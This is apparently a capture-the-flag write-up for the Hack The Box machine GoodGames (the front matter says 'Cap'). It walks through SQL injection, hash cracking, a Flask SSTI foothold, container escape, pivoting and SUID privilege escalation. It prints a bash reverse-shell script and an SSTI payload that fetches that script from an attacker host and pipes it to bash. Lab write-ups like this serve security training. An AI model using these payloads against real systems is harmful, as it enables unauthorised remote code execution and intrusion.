---
layout: post 
title: Cap
date: 
---
# Summary
This box is rated easy but it does involve a fair bit of work before rooting the box. Initial scan shows only a customized web application available, which turns out to be vulnerable to SQLi allowing the dumping of the administrator password. Password reuse is heavy for this box - the same password allows us to access the Flask Volt Dashboard, which is vulnerable to SSTI allowing a foothold on the box. 

While the foothold is as root, it appears that we are in a container image. Further enumeration reveals the host of the image, and the mounted folders allow us to privesc via a SUID binary. 

# Initial Enumeration
Running the usual nmap scan, the only entry point is via the Web Application.  
![nmap results](/docs/assets/images/htb/GoodGames/nmap_results.png)

# Enumerating the web app - SQLi gives us credentials
This is a customized application for the box. Looking at the source code, and running subdirectory enumeration returns nothing. 
![webapp screenshot](/docs/assets/images/htb/GoodGames/webapp.png)

Eventually, firing SQLmap against the login request shows the application is vulnerable to SQLi. I was not able to get a shell via SQLmap, so I dumped out the user table for credentials that cna possibly allow further access. The password looks to be a hash, since that is definitely not the password I used for my created account, but it is easily cracked by Crackstation. 
![sqli_creds](/docs/assets/images/htb/GoodGames/dumped_creds.png)

## SQLi Manually
It is always good to try if I am able to SQLi without SQLMap. In this case, since there appears to be some validation of the email format, I will use Burp Suite Repeater to verify the success of my injection. 

First I used the usual ORDER BY payload to discover the number of columns returned by the query. Knowing there are 4 columns in the result, I will have to discover which of the 4 will return a result to screen - this appears to be the fourth column.
![sqli_columntype](/docs/assets/images/htb/GoodGames/sqli_columntype.png)

Next I need to know what tables are there that are worth poking into, and also the columns for any table I am interested in. 
![sqli_tables](/docs/assets/images/htb/GoodGames/sqli_tables.png)
![sqli_user_columns](/docs/assets/images/htb/GoodGames/sqli_user_columns.png)

That will be enough information for me to dump the user table.
![sqli_user_dump](/docs/assets/images/htb/GoodGames/sqli_user_dump.png)

# Flask Volt Dashboard 
Logging in as the administrator, there seems to be an additional icon in the top right. This leads to another URL, which can be accessed once we add the mapping of the IP to the URL in /etc/hosts.
![admin view](/docs/assets/images/htb/GoodGames/admin_home.png)
![internal page](/docs/assets/images/htb/GoodGames/subdomain.png)
![flask dashboard](/docs/assets/images/htb/GoodGames/flask_volt.png)	

Thankfully, password reuse allows us to easily sign in as the administrator. Searching for flask volt dashboard exploits shows that Flask is potentially vulnerable to SSTI. The search function does not appear to be functioning, but testing the 'Name' field for the user settings show that this field is indeed vulnerable to SSTI - using the input '{{7\*7}}' returns '49' as our user name.
![testing for SSTI](/docs/assets/images/htb/GoodGames/ssti.png) 

The following payload will create a reverse shell through the bash script provided.

*rev.sh*
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.14/4444 0>&1
```

*Payload*
{% raw %}
```
{{config.__class__.__init__.__globals__['os'].popen('curl 10.10.14.14/rev.sh | bash').read()}}
``` 
{%endraw%}

![reverse shell](/docs/assets/images/htb/GoodGames/rev.png)

With this, we can retrieve user.txt. 

# Breaking out of the container 
While the foothold is as root, it does not appear that there is a root.txt available on this machine. Looking around the host, this could be a container - there is a dockerfile in the folder, a user directory for augustus but no corresponding user defined in /etc/passwd. The IP address of the foothold is different from the IP address used to reach the application as well.
![ip_difference](/docs/assets/images/htb/GoodGames/ip_a.png)	 

There is also a .dockerenv file - from research this is a file containing the environment variables defined inside the container.  
![dockerenv](/docs/assets/images/htb/GoodGames/dockerenv.png)

linpeas confirmed that the foothold is that of a container, and that augustus is mounted from the host as well. 
![linpeas](/docs/assets/images/htb/GoodGames/linpeas.png)
![mount](/docs/assets/images/htb/GoodGames/mount.png)

In the environment there is another host at 172.19.0.1 as well. 
![route](/docs/assets/images/htb/GoodGames/route.png)

Since the host is not reachable via Kali directly, pivoting is necessary. My go-to for this is ligolo-ng.
![ligolo-ng](/docs/assets/images/htb/GoodGames/ligolo-ng.png)
With the pivot set up and the internal host accessible, nmap shows two ports available. Port 80 is likely to be forwarded to 172.19.0.2:8085 and serving the web application. Trying SSH with the same password for augustus gives a foothold on this host.

# Privilege Escalation
Since we have root access in the container, and access to the host as well with /home/augustus mounted, hacktricks show that it is possible to use our root access to create a SUID binary in the shared folder through which the non-priv user can leverage for escalating privileges. In this case, the non-priv user can create a copy of bash. The root in the container will elevate its permission. 
![root elevating permission](/docs/assets/images/htb/GoodGames/root_elevation.png)
![SUID privesc](/docs/assets/images/htb/GoodGames/suid.png)









